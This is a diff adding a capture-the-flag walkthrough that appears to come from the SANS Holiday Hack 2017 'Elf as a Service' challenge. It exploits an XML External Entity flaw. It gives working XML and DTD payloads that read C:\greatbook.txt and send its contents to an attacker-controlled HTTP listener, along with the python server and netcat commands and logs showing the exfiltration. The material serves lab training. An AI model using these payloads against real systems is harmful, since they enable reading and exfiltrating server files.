@@ -16,83 +16,204 @@ What is the title of The Great Book page?
    :CUSTOM_ID: q6_background-information
    :END:
 
-Do we know anything about this system already?
+** Hints:
 
-Hints:
+ #+begin_hint
+ The Elf As A Service (EAAS) site is a new service we're experimenting with in the North Pole. Previously, if you needed a special engineer for toy production, you would have to write a memo and distribute it to several people for approval. All of that process is automated now, allowing production teams to request assistance through the EAAS site.
+ #+end_hint
 
-List any useful hints here.
+ #+begin_hint
+ The EAAS site uses XML data to manage requests from other teams. There is a sample request layout available that you can download. Teams just customize the XML and submit!
+ #+end_hint
 
-Blog Posts:
+ #+begin_hint
+ I think some of the elves got a little lazy toward the go-live date for EAAS. The sample XML data doesn't even include a DTD reference.
+ #+end_hint
 
-Are any of these useful?
+ #+begin_hint
+ XML processing can be complex. I saw an interesting article recently on the [[https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities][dangers of external XML entities]].
+ #+end_hint
 
-- Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
-  (EC2)
-  https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2
-  Spinning up an EC2 instance, but also a lot of emphasis on how to use
-  SSH keys.
-- Your Pokemon Guide for Essential SQL Pen Test Commands
-  https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands
-  SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
-- Exploiting XXE Vulnerabilities in IIS/.NET
-  https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities
-  Including remote content in XML
-- Why You Need the Skills to Tinker with Publicly Released Exploit Code
-  https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code
-  Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-  CVE-2017-9805 Code: https://github.com/chrisjd20/cve-2017-9805.py
-- Go To The Head Of The Class: LD\_PRELOAD For The Win
-  https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win
-- A Spot of Tee
-  https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee Restricted
-  bash shell, and bypassing the I/O restriction with tee
-- Understanding and Exploiting Web-based LDAP
-  https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap
-  LDAP syntax, LDAP injection
-- Massively Scaling your Scanning
-  https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning
-  masscan
+** Blog Posts:
+
+This post is called out in the hints:
+
+ Exploiting XXE Vulnerabilities in IIS.NET
+ https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities
+
+To pull off this attack, we'll need to host a file somewhere that the EaaS system can reach. We can either host it on l2s, in which case we'll use this blog post for creating a file on that system, which is locked down with =rbash=:
+
+ A Spot of Tee
+ https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee
+
+Alternatively, we could spin up an AWS VM using the instructions in this blog post:
+
+ Putting My Zero Cents In: Using the Free Tier on Amazon Web Services (EC2)
+ https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2
+
+The hints are all pretty strongly pointing us towards an {{{abbr(XML External Entity, XXE)}}} vulnerability.
 
 * Goal
    :PROPERTIES:
    :CUSTOM_ID: q6_goal
    :END:
 
-What are we trying to accomplish?
+We want to access C:\greatbook.txt, and then follow those instructions to retrieve a page of the Great Book.
 
 * Approach
    :PROPERTIES:
    :CUSTOM_ID: q6_approach
    :END:
 
-Describe the thought process that we tried here. How were we able to use
-the hints or the blog posts?
+We'll start with just pulling up the site in a browser:
+
+#+CAPTION: EaaS Home
+#+attr_html: :width 350px
+[[./images/eaas_home.png]]
+
+Poking around the site a bit, we see that it provides four functions:
+
+1. We can view our current Elf order at http://eaas.northpolechristmastown.com/Home/DisplayXML,
+2. On that same page, we can make a change to our order by uploading a file,
+3. We can reset the XML file here: http://eaas.northpolechristmastown.com/Home/CreateElfs,
+4. We can download the XML file here: http://eaas.northpolechristmastown.com/XMLFile/Elfdata.xml
+
+All this XML talk lines up pretty well with the blog post and the hints. Let's see if the EaaS site is vulnerable to {{{abbr(XML External Entity, XXE)}}}.
+
+Following along with the blog post, we'll create a malicious
+{{{abbr(Data Type Definition, DTD)}}} file, borrowing liberally from the SANS post:
+
+#+CAPTION: The DTD File
+#+BEGIN_SRC xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
+<!ENTITY % inception "<!ENTITY % sendit SYSTEM 'http://10.142.0.11:8272/?%stolendata;'>">
+#+END_SRC
+
+If we can get the XML parser to use this {{{abbr(Data Type Definition, DTD)}}} 
+file, it will read our target text file, then send it to a system that
+we control. This file doesn't help the parser know how to parse our
+XML, but we don't really care if it gets parsed correctly or not.
+
+In order to have the XML parser load this {{{abbr(Data Type Definition, DTD)}}} file, we'll use the XML example in the blog post:
+
+#+begin_note
+This example in the blog post had a typo, where the last character was a =<= instead of a =>=.
+#+end_note
+
+#+CAPTION: The XML File
+#+BEGIN_SRC xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE demo [
+    <!ELEMENT demo ANY >
+    <!ENTITY % extentity SYSTEM "http://10.142.0.11:8271/evil.dtd">
+    %extentity;
+    %inception;
+    %sendit;
+    ]
+>
+#+END_SRC
+
+This will load our evil.dtd file, then instantiate the necessary
+entities. To finish off the attack, we'll need two HTTP services
+running. The first will need to serve the evil.dtd file. Python's
+=SimpleHTTPServer= is the easiest way to do this, and in fact, that's
+provided on l2s. We'll create our file, with tee, then start a
+server. Ports 8080 and 4444 are very contentious on l2s, so we'll use
+non-standard ones instead:
+
+#+BEGIN_SRC
+alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.EtweHkIXQZGuoo51RBy2FSyA$ cat | tee evil.dtd
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
+<!ENTITY % inception "<!ENTITY % sendit SYSTEM 'http://1.2.3.4:8272/?%stolendata;'>">
+<!ENTITY % inception "<!ENTITY % sendit SYSTEM 'http://1.2.3.4:8272/?%stolendata;'>">
+alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.EtweHkIXQZGuoo51RBy2FSyA$ python -m SimpleHTTPServer 8271
+Serving HTTP on 0.0.0.0 port 8271 ...
+#+END_SRC
+
+In another terminal, we'll start up a =netcat= listener, to capture the response:
+
+#+BEGIN_SRC 
+alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.sHkbOWKtpdnH8SGpCM2VAMgL$ nc -l -p 8272
+#+END_SRC
+
+With these services in place, we're ready to upload our malicious XML file. Using a web browser, we'll upload our XML file, and then see what happens.
+
+#+BEGIN_SRC 
+Serving HTTP on 0.0.0.0 port 8271 ...
+10.142.0.13 - - [10/Jan/2018 22:26:43] "GET /evil.dtd HTTP/1.1" 200 -
+#+END_SRC
+
+Great, our DTD file was loaded! And checking our =netcat= instance:
+
+#+BEGIN_SRC 
+alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.sHkbOWKtpdnH8SGpCM2VAMgL$ nc -l -p 8272
+#+END_SRC
+
+...nothing. That's disappointing. We've already noticed one typo in
+the blog. Could it be possible that there was another error? Taking a
+close look at the image on the page, we notice that part of the DTD
+file is escaped differently from how the example shows up on the
+webpage:
+
+#+CAPTION: DTD File
+#+attr_html: :width 350px
+[[./images/eaas_dtd.png]]
+
+We'll update our DTD file, so that the percent sign before ~sendit~ is escaped:
+
+#+BEGIN_SRC xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
+<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://10.142.0.11:8272/?%stolendata;'>">
+#+END_SRC
+
+We'll upload our file one more time, and...
+
+#+BEGIN_SRC 
+alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.yNLdj0xcg7AZi5v1gYns2lFO$ nc -l -p 8272
+GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1
+Host: 10.142.0.11:8272
+Connection: Keep-Alive
+#+END_SRC
+
+Success! In the =GET= request, the text after =?= is the contents of C:\greatbook.txt. If we pull up that URL, we get page 6.
 
 * Solution
    :PROPERTIES:
    :CUSTOM_ID: q6_solution
    :END:
 
-Summarize the reference solution that we found
+We upload this XML file:
 
-* Alternatives
-   :PROPERTIES:
-   :CUSTOM_ID: q6_alternatives
-   :END:
+#+BEGIN_SRC xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE demo [
+    <!ELEMENT demo ANY >
+    <!ENTITY % extentity SYSTEM "http://10.142.0.11:8271/evil.dtd">
+    %extentity;
+    %inception;
+    %sendit;
+    ]
+>
+#+END_SRC
 
-Any other, easier solutions?
+And this is our DTD:
+
+#+BEGIN_SRC xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
+<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://10.142.0.11:8272/?%stolendata;'>">
+#+END_SRC
+
+When we upload our XML file, we receive the contents of the target file, and can then download the PDF.
 
 * Common Pitfalls
    :PROPERTIES:
    :CUSTOM_ID: q6_common-pitfalls
    :END:
 
-Do we know what issue(s) people were running into?
-
-* About the Challenge
-   :PROPERTIES:
-   :CUSTOM_ID: q6_about-the-challenge
-   :END:
-
-How was the challenge setup? Was there a better way to secure this
-system?
+This followed closely to the SANS blog post, but there was a typo and an HTML rendering issue with some of the provided code that caused some headaches.
